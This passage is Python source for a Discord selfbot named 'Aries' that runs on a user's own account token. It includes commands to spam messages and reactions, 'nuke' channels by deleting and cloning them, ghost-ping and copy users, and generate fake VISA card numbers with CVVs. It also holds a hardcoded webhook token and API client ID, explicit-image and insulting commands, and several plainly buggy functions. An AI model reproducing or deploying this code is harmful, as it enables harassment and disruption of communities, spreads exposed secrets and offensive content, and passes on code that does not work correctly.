    await ctx.send(embed = embed)  
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def selfbotdetector(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Selfbot Detection", description = f"{selfbot_detector}", color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif%22")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def nick(ctx, member: discord.Member, nick):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    await member.nick(nick = nick)
    embed = discord.Embed(title= "Aries Notifcation", description = "Set Nick To: " + nick, color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif%22")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def spam(ctx, delay: int, count, *, message):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for i in range(int(count)):
        await ctx.send(message)
        await asyncio.sleep(delay)
@bot.command()
async def time(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    now = dt.now()
    current_time = now.strftime("%H:%M:%S")
    embed = discord.Embed(title= "Aries Notifcation", description = "Current time: " + current_time, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def date(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    today = dt.today().strftime('%Y-%m-%d')
    embed = discord.Embed(title= "Aries Notifcation", description = "Current Date: " + today, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def server(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    memcount = len([m for m in ctx.guild.members if not m.bot]) # doesn't include bots
    embed = discord.Embed(title= "Aries Info on: " + str(guild), description = "Server has: " + str(memcount) + " Members" , color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def invite(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    guild = ctx.guild
    link = await ctx.channel.create_invite(max_age = 300)
    embed = discord.Embed(title= "Aries Invite for " + str(guild), description = "Invite: " + str(link) , color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def nuke(ctx):
    await ctx.channel.delete()
    channel = await ctx.channel.clone()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries", description = f"Successfully Nuked {channel}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await channel.send(embed = embed)
@bot.command()
async def meme(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    memes = ["https://i.redd.it/5mstqjaymuf41.jpg", "https://img.buzzfeed.com/buzzfeed-static/static/2021-01/28/19/campaign_images/93697a775252/just-a-bunch-of-good-memes-about-how-reddit-succe-2-1453-1611863916-11_dblbig.jpg?resize=1200:*", "https://preview.redd.it/do5c7wed6r861.png?auto=webp&s=73605a17e8c4d4f3854e5fdd46a8fe4a09a118e9", "https://preview.redd.it/do5c7wed6r861.png?auto=webp&s=73605a17e8c4d4f3854e5fdd46a8fe4a09a118e9", "https://pbs.twimg.com/media/D77OV5DXYAAxbP-.png", "https://i.redd.it/jw2ewoutld331.jpg", "https://cdn.vox-cdn.com/thumbor/DgjQ7atpTIT4bCa176C0NdaN7r8=/1400x788/filters:format(png)/cdn.vox-cdn.com/uploads/chorus_asset/file/13751928/Screen_Shot_2019_02_11_at_11.40.05_AM.png"]
    embed = discord.Embed(title= "Aries Meme", description = "Take a Meme!", color=readableHex)
    embed.set_image(url = str(random.choice(memes)))
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed = embed)
@bot.command()
async def ghostping(ctx, user: discord.User):
    await ctx.message.delete()
@bot.command()
async def genpass(ctx, length):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    result_str = ''.join(random.choice(string.ascii_letters + "12345678910/;':[']|") for i in range(int(length)))
    embed = discord.Embed(title= "Aries Password Generator", description = result_str, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def sendnoti(ctx, title, message):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    notif = ToastNotifier()
    notif.show_toast(title, message, icon_path="assets/ariesnobg.ico", duration=10)
    embed = discord.Embed(title= "Aries Notifcation ", description = "Sent Noti!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def pussy(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    pussy = ["https://i.redd.it/xhwxmqgtnkq51.jpg", "https://i.redd.it/r216hpdlzd171.jpg", "https://preview.redd.it/f62vvitj2og61.jpg?auto=webp&s=a8ab4ae4e4c4bc86b5b21f9967058f09ddddb28c"]
    embed = discord.Embed(title= "", description = "", color=readableHex)
    embed.set_image(url = str(random.choice(pussy)))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def hentaigif(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    gifs = ["https://25.media.tumblr.com/tumblr_m1v7mdNnzg1r6wwpso1_400.gif", "https://i.redd.it/h6oi753u0ts41.gif"]
    embed = discord.Embed(title= "", description = "", color=readableHex)
    embed.set_image(url = str(random.choice(gifs)))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def uploadimage(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for attachment in ctx.message.attachments:
        # Download Image to file location
        await attachment.save(attachment.filename)

    CLIENT_ID = "26961e77de57def"
    im = pyimgur.Imgur(CLIENT_ID)
    attachment_url = ctx.message.attachments[0].filename
    #Upload image where it downloads it
    uploaded_image = im.upload_image(str(os.getcwd() + "/" + attachment_url), title="Uploaded with Aries")
    uploaded = "true"
    #Print Image
    embed = discord.Embed(title= "Aries Imgur", description = "Uploaded: " + str(uploaded_image.link), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    if (uploaded == "true"):
     
     os.remove((str(os.getcwd() + "/" + attachment_url)))
     uploaded = "false"
    await ctx.send(embed = embed)
@bot.command()
async def afkmessage(ctx, *, message):
    await ctx.message.delete()
    data = {
        "token": f"{token}",
        "prefix": f"{prefix}",
        "sniper": f"{nitro_sniper}",
        "detector": f"{selfbot_detector}",
        "theme": f"{theme_2}",
        "AFK": f"{afkmode}",
        "AFK-Message": f"{message}",
        "Fake-Nitro": f"{fake_nitro}"
    }
    with open("./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries AFK", description = f"Set AFK Message To: {message}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def copycat(ctx, user: discord.User, value: bool):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global copier
    copier = value
    global person
    person = user.name
    embed = discord.Embed(title= "Aries Copycat", description = "Now Copying: " + str(person) + " Set Copier to: " + str(copier), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def spamreact(ctx, id):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    msg = await ctx.fetch_message(id)
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
    await msg.add_reaction('❤️')
    await msg.add_reaction('😳')
    await msg.add_reaction('😍')
    await msg.add_reaction('😠')
    await msg.add_reaction('😈')
    await msg.add_reaction('😔')
    await msg.add_reaction('💀')
    await msg.add_reaction('👑')
    await msg.add_reaction('🍴')
    await msg.add_reaction('🍉')
    await msg.add_reaction('💯')
    await msg.add_reaction('🥺')
    await msg.add_reaction('😍')
    await msg.add_reaction('🥵')
    await msg.add_reaction('🧠')
    await msg.add_reaction('🤔')
    await msg.add_reaction('🙄')
    await msg.add_reaction('🙌')
    await msg.add_reaction('☠️')
@bot.command()
async def genusername(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    chars = "abcdefghijklmnopqrstuvwxyz"
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    username = '{}{}{}'.format(random.choice(chars), random.choice(chars)[-1][:3].rjust(3, random.choice(chars)), '{:03d}'.format(random.randrange (1,999)))
    embed = discord.Embed(title= config.get('title'), description = f"Username: {str(username)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)   
@bot.command()
async def poll(ctx, *, question):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"{question}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)   
    await msg.add_reaction('\N{THUMBS UP SIGN}')
    await msg.add_reaction('\N{THUMBS DOWN SIGN}')
@bot.command()
async def setsniper(ctx, value):
    await ctx.message.delete()
    global afkmode
    args1 = str(value)
    args2 = args1.replace("T", "t")
    data = {
        "token": f"{token}",
        "prefix": f"{prefix}",
        "sniper": f"{args2}",
        "detector": f"{selfbot_detector}",
        "theme": f"{theme_2}",
        "AFK": f"{afkmode}",
        "AFK-Message": f"{afkmsg}",
        "Fake-Nitro": f"{fake_nitro}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Sniper", description = "Sniper is: " + str(args2), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)  
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def crypto(ctx):
    #TODO Add More Cryptos
    url = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd%2Ceur%2Cgbp"
    url2 = "https://api.coingecko.com/api/v3/simple/price?ids=dogecoin&vs_currencies=usd%2Ceur%2Cgbp"
    r = requests.get(url)
    r2= requests.get(url2)
    rToJson = r.json()
    r2ToJson = r2.json()

    btcUSD = rToJson["bitcoin"]["usd"]
    btcEUR = rToJson["bitcoin"]["eur"]
    btcGBP = rToJson["bitcoin"]["gbp"]
    dogeUSD = r2ToJson["dogecoin"]["usd"]
    dogeEUR = r2ToJson["dogecoin"]["eur"]
    dogeGBP = r2ToJson["dogecoin"]["gbp"]
    print(rToJson)
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    
    embed = discord.Embed(title= "Aries Crypto", description = f"Bitcoin: USD: {btcUSD} - EUR: {btcEUR} - GPB: {btcGBP}\nDogecoin: USD: {dogeUSD} - EUR: {dogeEUR} - GBP: {dogeGBP}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def settheme(ctx, theme1):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global theme
    global afkmode
    global afkmsg
    theme = theme1
    data = {
        "token": f"{token}",
        "prefix": f"{prefix}",
        "sniper": f"{nitro_sniper}",
        "detector": f"{selfbot_detector}",
        "theme": f"{theme1}",
        "AFK": f"{afkmode}",
        "AFK-Message": f"{afkmsg}",
        "Fake-Nitro": f"{fake_nitro}"
    }
    with open("./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    embed = discord.Embed(title= "Aries Theme", description = "Theme is: " + theme1, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def uploadtheme(ctx, themename):
    await ctx.message.delete()
    try:
        webhook = discord.Webhook.partial(900202510726332426, 'hzY_ELOwg1emz_xbpZvTtpv6Ee0NbPyy9yb7qpuumirnqovsRbk_asYPz6YbK1eaSWjb', adapter=discord.RequestsWebhookAdapter()) # Your webhook
        with open(file=f'./data/themes/{themename}' + ".json", mode='rb') as f:
         my_file = discord.File(f)
        webhook.send(f'Theme Name: {themename}', username='Themes', file=my_file)
    except Exception as e:
        pass
@bot.command()
async def edittheme(ctx, name, newtitle, newimage, newcolor, newtcolor):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    data = {
        "title": f"{newtitle}",
        "imageurl": f"{newimage}",
        "color": f"{newcolor}",
        "TColor": f"{newtcolor}"
    }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    embed = discord.Embed(title= "Aries Theme", description = f"Edited theme: {name}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def fakecreditcard(ctx):
    await ctx.message.delete()
    def generate():
        key = ''
        portion = ''
        characters = '123456789'

        while True:
            while len(key) < 20:
                character = "" + random.choice(characters) # pick a random character from the string above and ...
                key += character # append to th key
                portion += character

                if len(portion) == 4:
                    key += ' ' # add a hyphen after every 4 characters to get the aaaa-bbbb-cccc-dddd-3333 format
                    portion = ''
            key = key[:-1]
            card = re.sub(r'.', '', key, count = 1)
            return "4" + card
    def gencw():
        key = ''
        portion = ''
        characters = '123456789'

        while True:
            while len(key) < 3:
                character = "4" + random.choice(characters) # pick a random character from the string above and ...
                key += character # append to th key
                portion += character
            key = key[:-1]
            return key       
    with open(f"./data/themes/{theme_2}.json") as f: 
        config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    credNUmber = generate()
    cw = gencw()
    embed = discord.Embed(title= config.get('title'), description = f"Fake Number: {credNUmber} CW: {cw}\nType: VISA\nExpiration: 02/22", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)

@bot.command()
async def installtheme(ctx, name):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    data = ""
    if name == "Midnight":
     data = {
    "title": "Midnight",
    "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900160094287843338/mystical-midnight-sky-with-stars-surrounded-by-dramatic-clouds-dark-picture-id1133588496.png",
    "color": "#191970",
    "TColor": "Cyan"
       }
    else:
        if name == "ShootingStar":
         data = {
        "title": "Shooting Star",
        "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900205216580907038/a2a66b1b23b23791e5d73a00b9325d04.gif",
        "color": "#191970",
        "TColor": "Cyan"
       }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    embed = discord.Embed(title= "Aries Theme", description = f"Installed theme: {name}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def createtheme(ctx, title, imageurl, color, tcolor):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    data = {
        "title": f"{title}",
        "imageurl": f"{imageurl}",
        "color": f"{color}",
        "TColor": f"{tcolor}"
    }
    with open(f"./data/themes/{name}.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    embed = discord.Embed(title= "Aries Theme", description = f"Made theme: {name}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def NitroSound(ctx, value):
    await ctx.message.delete()
    global NitroSound
    if (value == "false" or "False"):
        NitroSound = False
    elif (value == "True" or "true"):
        NitroSound = True
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    
    embed = discord.Embed(title= config.get('title'), description = f"Sounds For Sniper Are: {value}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def availablethemes(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    
    embed = discord.Embed(title= "Aries Theme", description = f"Themes you can Install:\nMidnight\nShootingStar", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def howgay(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    gay = random.randrange(1, 100)
    if gay > 50:
        isgay = "Gay!"
    else:
        isgay = "Straight"
    gay2 = str(gay) + "%"
    embed = discord.Embed(title= f"I've determined hes {isgay}", description = f"{user} is {gay2} gay!", color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/790796610388492299/898081227880423424/Z.png")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def dicksize(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    dongs = "8{}D".format("=" * random.randint(0, 30))
    if len(dongs) < 15:
        issmall = "I CANT SEE IT"
    else:
        issmall = "ITS HUGE"
    embed = discord.Embed(title= f"Ive determined: {issmall}", description = f"{user}'s' Dick is {dongs}", color=readableHex)
    embed.set_thumbnail(url = "https://c.tenor.com/GeFTyQnfPR0AAAAM/penis-standing-erect.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def custompres(ctx, message):
    await ctx.message.delete()
    for i in range(len(message)):
        await bot.change_presence(activity=discord.CustomActivity(name=message[:i+1] ,emoji='🖥️'))
        await asyncio.sleep(0.4)
@bot.command()
async def uptime(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global start_time
    end_time = datetime.now()
    embed = discord.Embed(title= config.get('title'), description = 'Time Since Start: {}'.format(end_time - start_time), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def evenorodd(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = 'You have 10 seconds to guess even or odd!', color=readableHex)
    embed2 = discord.Embed(title= config.get('title'), description = str(random.randrange(0, 999)), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    embed2.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed2.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)
    sleep(10)
    await msg.edit(embed = embed2)
@bot.command()
async def steppingstones(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    fall = ["You Fell!", "Your Safe!", "You Fell!", "Your Safe!", "You Fell!", "Your Safe!", "You Fell!", "Your Safe!"]
    embed = discord.Embed(title= config.get('title'), description = 'You Jumped! Did you fall? (wait 5 seconds)', color=readableHex)
    embed2 = discord.Embed(title= config.get('title'), description = str(random.choice(fall)), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    embed2.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed2.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)
    sleep(5)
    await msg.edit(embed = embed2)
def animate_Rocket():
    distanceFromTop = 20
    isdone = False
    while True and isdone == False:
        print("\n" * distanceFromTop)
        print("          /\        ")
        print("        .'  '.        ")
        print("       /======\       ")
        print("      ;:.  _   ;       ")
        print("      |:. (_)  |")
        print("      |:.  _   |")
        print("      |:. (_)  |")
        print("      ;:.      ;")
        print("    .' \:.    / `.")
        print("   / .-'':._.'`-. \   ")
        print("   |/    /||\    \|")

        sleep(0.2)
        os.system('cls' if os.name == 'nt' else 'clear')  
        distanceFromTop -= 1
        if distanceFromTop <0:
            isdone = True
            global nitro_sniper
            global build
            global prefix
            global copier
            global selfbot_detector
            os.system('cls' if os.name == 'nt' else 'clear')
            global ctu
            print(f"{ctu}                                                   ___         _          ")
            print(f"{ctu}                                                  /   |  _____(_)__  _____")
            print(f"{ctu}                                                 / /| | / ___/ / _ \/ ___/")
            print(f"{ctu}                                                / ___ |/ /  / /  __(__  ) ")
            print(f"{ctu}                                               /_/  |_/_/  /_/\___/____/  ")
            print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
            print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + commandamt + Fore.RESET + "Commands!")
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + build + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
@bot.command()
async def rocket(ctx):
    distanceFromTop = 20
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
#     /\        
#     ||       
#     ||       
#    /||\
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    animate_Rocket()
@bot.command()
async def typewrite(ctx, delay: int, *, message):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    msg = await ctx.send(message[0])
    for i in range(len(message)):
        await msg.edit(content=message[:i+1])
        await asyncio.sleep(delay)
@bot.command()
